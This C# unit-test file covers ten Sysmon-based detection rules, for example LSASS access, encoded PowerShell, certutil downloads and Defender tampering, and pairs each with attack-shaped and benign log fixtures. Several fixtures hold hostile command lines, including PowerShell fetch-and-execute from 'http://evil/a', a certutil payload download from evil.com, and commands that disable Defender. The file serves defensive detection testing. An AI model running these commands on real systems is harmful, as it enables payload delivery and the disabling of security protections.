using FluentAssertions;
using SecAudit.Core.Models;
using SecAudit.Modules.LogForensics.Models;
using SecAudit.Modules.LogForensics.Rules;
using SecAudit.Modules.LogForensics.Rules.Sysmon;
using Xunit;

namespace SecAudit.Modules.LogForensics.Tests;

/// <summary>
/// Unit-level tests for the 10 Sysmon-oriented detection rules. These bypass the EVTX
/// parser and feed <see cref="LogRecord"/> fixtures directly into each rule — which is the
/// standard way to test correlation/detection logic without needing to hand-craft binary
/// EVTX files on disk.
///
/// Each rule gets:
/// <list type="bullet">
/// <item>A POSITIVE case — an attack-shaped record must fire exactly 1 finding.</item>
/// <item>A NEGATIVE/benign case — a legitimate-looking record must NOT fire.</item>
/// <item>(For stateful rules) a RESET case — state must be cleared across runs so
/// the second run fires again on the same input.</item>
/// </list>
/// </summary>
public sealed class SysmonRuleTests
{
    private static ForensicsContext Ctx() => new()
    {
        UserWhitelist = new HashSet<string>(StringComparer.OrdinalIgnoreCase),
        InternalCidrs = Array.Empty<CidrRange>(),
        MachineName = "TEST-HOST"
    };

    private static LogRecord Record(string kind, Dictionary<string, string> fields,
        long offset = 1, string sourceFile = "test.evtx")
        => new()
        {
            Timestamp = DateTimeOffset.UtcNow,
            SourceFile = sourceFile,
            SourceOffset = offset,
            Os = "windows",
            RawLine = "fixture",
            EventKind = kind,
            Fields = fields
        };

    // ============================================================
    // 1. LsassAccessRule (T1003.001)
    // ============================================================

    [Fact]
    public void LsassAccessRule_fires_on_mimikatz_mask()
    {
        var rule = new LsassAccessRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.processaccess", new()
        {
            ["SourceImage"] = @"C:\Users\Public\mimi.exe",
            ["TargetImage"] = @"C:\Windows\System32\lsass.exe",
            ["GrantedAccess"] = "0x1410"
        }), ctx);

        ctx.Findings.Should().ContainSingle()
            .Which.Severity.Should().Be(Severity.Critical);
        ctx.Findings[0].Category.Should().Be("log-forensics.credential-access");
    }

    [Fact]
    public void LsassAccessRule_ignores_defender()
    {
        var rule = new LsassAccessRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.processaccess", new()
        {
            ["SourceImage"] = @"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe",
            ["TargetImage"] = @"C:\Windows\System32\lsass.exe",
            ["GrantedAccess"] = "0x1410"
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    [Fact]
    public void LsassAccessRule_Reset_reenables_detection()
    {
        var rule = new LsassAccessRule();
        var r = Record("sysmon.processaccess", new()
        {
            ["SourceImage"] = @"C:\Users\Public\evil.exe",
            ["TargetImage"] = @"C:\Windows\System32\lsass.exe",
            ["GrantedAccess"] = "0x1410"
        });

        var ctx1 = Ctx();
        rule.Observe(r, ctx1);
        ctx1.Findings.Should().HaveCount(1);

        // Without Reset, dedup HashSet should suppress a second fire.
        var ctx2 = Ctx();
        rule.Observe(r, ctx2);
        ctx2.Findings.Should().BeEmpty();

        // After Reset, same input fires again.
        rule.Reset();
        var ctx3 = Ctx();
        rule.Observe(r, ctx3);
        ctx3.Findings.Should().HaveCount(1);
    }

    // ============================================================
    // 2. RemoteThreadInjectionRule (T1055)
    // ============================================================

    [Fact]
    public void RemoteThreadInjection_fires_on_sensitive_target()
    {
        var rule = new RemoteThreadInjectionRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.createremotethread", new()
        {
            ["SourceImage"] = @"C:\Windows\System32\wscript.exe",
            ["TargetImage"] = @"C:\Windows\System32\lsass.exe",
            ["StartAddress"] = "0x7FFB1234",
            ["StartModule"] = ""  // unmapped == shellcode hint
        }), ctx);

        ctx.Findings.Should().ContainSingle()
            .Which.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void RemoteThreadInjection_ignores_av_agent()
    {
        var rule = new RemoteThreadInjectionRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.createremotethread", new()
        {
            ["SourceImage"] = @"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe",
            ["TargetImage"] = @"C:\Windows\System32\notepad.exe",
            ["StartAddress"] = "0x1000"
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    // ============================================================
    // 3. DllSideloadRule (T1574.002)
    // ============================================================

    [Fact]
    public void DllSideload_fires_on_ms_binary_loading_user_dir_dll()
    {
        var rule = new DllSideloadRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.imageload", new()
        {
            ["Image"] = @"C:\Windows\System32\rundll32.exe",
            ["ImageLoaded"] = @"C:\Users\Public\version.dll",
            ["Signed"] = "true",
            ["Company"] = "Microsoft Corporation",
            ["SignatureStatus"] = "Unavailable"
        }), ctx);

        ctx.Findings.Should().ContainSingle();
        ctx.Findings[0].Severity.Should().BeOneOf(Severity.High, Severity.Critical);
    }

    [Fact]
    public void DllSideload_ignores_system32_load()
    {
        var rule = new DllSideloadRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.imageload", new()
        {
            ["Image"] = @"C:\Windows\System32\rundll32.exe",
            ["ImageLoaded"] = @"C:\Windows\System32\version.dll",
            ["Signed"] = "true",
            ["Company"] = "Microsoft Corporation",
            ["SignatureStatus"] = "Valid"
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    // ============================================================
    // 4. EncodedPowerShellRule (T1059.001)
    // ============================================================

    [Fact]
    public void EncodedPowerShell_fires_on_enc_flag()
    {
        var rule = new EncodedPowerShellRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.process", new()
        {
            ["Image"] = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ["CommandLine"] = "powershell.exe -enc JABjAG0AZAAgAD0AIAAn...",
            ["ParentImage"] = @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            ["User"] = "DOMAIN\\alice"
        }), ctx);

        // Parent = WINWORD → escalates to Critical
        ctx.Findings.Should().ContainSingle()
            .Which.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void EncodedPowerShell_ignores_plain_admin_command()
    {
        var rule = new EncodedPowerShellRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.process", new()
        {
            ["Image"] = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ["CommandLine"] = "powershell.exe -NoProfile -Command Get-Service",
            ["ParentImage"] = @"C:\Windows\explorer.exe"
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    // ============================================================
    // 5. NamedPipeC2Rule (T1021.002)
    // ============================================================

    [Fact]
    public void NamedPipeC2_fires_on_cobalt_strike_default_pipe()
    {
        var rule = new NamedPipeC2Rule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.pipecreate", new()
        {
            ["PipeName"] = @"\msagent_4a",
            ["Image"] = @"C:\Windows\System32\rundll32.exe"
        }), ctx);

        ctx.Findings.Should().ContainSingle()
            .Which.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void NamedPipeC2_ignores_benign_rpc_pipe()
    {
        var rule = new NamedPipeC2Rule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.pipecreate", new()
        {
            ["PipeName"] = @"\ntsvcs",
            ["Image"] = @"C:\Windows\System32\services.exe"
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    // ============================================================
    // 6. OfficeChildProcessRule (T1566 / T1204)
    // ============================================================

    [Fact]
    public void OfficeChildProcess_fires_on_winword_powershell()
    {
        var rule = new OfficeChildProcessRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.process", new()
        {
            ["ParentImage"] = @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            ["Image"] = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ["CommandLine"] = "powershell -nop -w hidden -c iex(iwr http://evil/a)",
            ["ParentCommandLine"] = "\"WINWORD.EXE\" /n /dde"
        }), ctx);

        ctx.Findings.Should().ContainSingle()
            .Which.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void OfficeChildProcess_ignores_explorer_notepad()
    {
        var rule = new OfficeChildProcessRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.process", new()
        {
            ["ParentImage"] = @"C:\Windows\explorer.exe",
            ["Image"] = @"C:\Windows\System32\notepad.exe",
            ["CommandLine"] = "notepad.exe"
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    // ============================================================
    // 7. WmiPersistenceRule (T1546.003)
    // ============================================================

    [Fact]
    public void WmiPersistence_fires_on_binding_critical()
    {
        var rule = new WmiPersistenceRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.wmibinding", new()
        {
            ["Name"] = "BackdoorBind",
            ["Operation"] = "Created",
            ["User"] = "NT AUTHORITY\\SYSTEM"
        }), ctx);

        ctx.Findings.Should().ContainSingle()
            .Which.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void WmiPersistence_ignores_default_scm_filter()
    {
        var rule = new WmiPersistenceRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.wmifilter", new()
        {
            ["Name"] = "SCM Event Log Filter",
            ["Operation"] = "Created"
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    // ============================================================
    // 8. SuspiciousScCreateRule (T1543.003)
    // ============================================================

    [Fact]
    public void SuspiciousScCreate_fires_on_user_writable_binPath()
    {
        var rule = new SuspiciousScCreateRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.process", new()
        {
            ["Image"] = @"C:\Windows\System32\sc.exe",
            ["CommandLine"] = @"sc.exe create EvilSvc binPath= ""C:\Users\Public\payload.exe"" type= own start= auto"
        }), ctx);

        ctx.Findings.Should().ContainSingle()
            .Which.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void SuspiciousScCreate_ignores_legit_system32_service()
    {
        var rule = new SuspiciousScCreateRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.process", new()
        {
            ["Image"] = @"C:\Windows\System32\sc.exe",
            ["CommandLine"] = @"sc.exe create MyService binPath= ""C:\Windows\System32\myservice.exe"""
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    // ============================================================
    // 9. LolBinIngressRule (T1105)
    // ============================================================

    [Fact]
    public void LolBinIngress_fires_on_certutil_urlcache()
    {
        var rule = new LolBinIngressRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.process", new()
        {
            ["Image"] = @"C:\Windows\System32\certutil.exe",
            ["CommandLine"] = @"certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\Users\Public\p.exe",
            ["ParentImage"] = @"C:\Windows\System32\cmd.exe",
            ["User"] = "DOMAIN\\bob"
        }), ctx);

        ctx.Findings.Should().ContainSingle();
        ctx.Findings[0].Evidence.Should().Contain("http://evil.com/payload.exe");
    }

    [Fact]
    public void LolBinIngress_ignores_certutil_verify()
    {
        var rule = new LolBinIngressRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.process", new()
        {
            ["Image"] = @"C:\Windows\System32\certutil.exe",
            ["CommandLine"] = @"certutil.exe -verify mycert.cer"
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    // ============================================================
    // 10. DefenderTamperingRule (T1562.001)
    // ============================================================

    [Fact]
    public void DefenderTampering_fires_on_disable_realtime_cmd()
    {
        var rule = new DefenderTamperingRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.process", new()
        {
            ["Image"] = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ["CommandLine"] = "powershell Set-MpPreference -DisableRealtimeMonitoring $true"
        }), ctx);

        ctx.Findings.Should().ContainSingle()
            .Which.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void DefenderTampering_fires_on_registry_disable()
    {
        var rule = new DefenderTamperingRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.regset", new()
        {
            ["TargetObject"] = @"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
            ["Details"] = "DWORD (0x00000001)",
            ["Image"] = @"C:\Windows\System32\reg.exe"
        }), ctx);

        ctx.Findings.Should().ContainSingle()
            .Which.Severity.Should().Be(Severity.Critical);
    }

    [Fact]
    public void DefenderTampering_ignores_regular_policy_set()
    {
        var rule = new DefenderTamperingRule();
        var ctx = Ctx();
        rule.Observe(Record("sysmon.regset", new()
        {
            ["TargetObject"] = @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OneDrive",
            ["Details"] = "C:\\Users\\x\\AppData\\Local\\OneDrive.exe"
        }), ctx);

        ctx.Findings.Should().BeEmpty();
    }

    // ============================================================
    // Sanity: all 10 rule Ids are unique
    // ============================================================

    [Fact]
    public void All_sysmon_rule_ids_are_unique()
    {
        var rules = new IDetectionRule[]
        {
            new LsassAccessRule(),
            new RemoteThreadInjectionRule(),
            new DllSideloadRule(),
            new EncodedPowerShellRule(),
            new NamedPipeC2Rule(),
            new OfficeChildProcessRule(),
            new WmiPersistenceRule(),
            new SuspiciousScCreateRule(),
            new LolBinIngressRule(),
            new DefenderTamperingRule()
        };

        var ids = rules.Select(r => r.Id).ToList();
        ids.Should().OnlyHaveUniqueItems();
        ids.Should().AllSatisfy(id => id.Should().StartWith("SYSMON-"));
    }
}
